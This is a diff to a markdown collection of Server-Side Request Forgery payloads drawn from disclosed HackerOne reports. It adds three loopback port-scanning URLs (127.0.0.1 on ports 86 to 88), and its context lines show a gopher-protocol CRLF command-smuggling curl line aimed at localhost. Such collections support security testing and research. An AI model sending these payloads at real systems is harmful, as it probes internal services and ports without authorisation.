@@ -1,6 +1,6 @@
 # Server-Side Request Forgery
 
-147 payloads from disclosed reports.
+150 payloads from disclosed reports.
 
 ## Server-Side Request Forgery (SSRF) via the image_host GET parameter
 
@@ -478,6 +478,33 @@ curl "gopher://localhost:7070/1/legitimate%0d%0ainjected%0d%0amalicious"
 ```
 
 — [Gopher Protocol Command Injection (SSRF Smuggling)](https://hackerone.com/reports/3508785) · curl · [andrew-bbp](https://hackerone.com/andrew-bbp)
+
+
+## SSRF port‑scanning via URL input
+
+### `f0bfcee6`
+
+```
+https://127.0.0.1:86
+```
+
+— [Internal Blind Server-Side Request Forgery (SSRF) allows scanning internal ports](https://hackerone.com/reports/2015554) · Mozilla · [harshdranjan](https://hackerone.com/harshdranjan)
+
+### `36f7937e`
+
+```
+https://127.0.0.1:88
+```
+
+— [Internal Blind Server-Side Request Forgery (SSRF) allows scanning internal ports](https://hackerone.com/reports/2015554) · Mozilla · [harshdranjan](https://hackerone.com/harshdranjan)
+
+### `80951689`
+
+```
+https://127.0.0.1:87
+```
+
+— [Internal Blind Server-Side Request Forgery (SSRF) allows scanning internal ports](https://hackerone.com/reports/2015554) · Mozilla · [harshdranjan](https://hackerone.com/harshdranjan)
 
 
 ## SSRF targeting AWS metadata service via URL
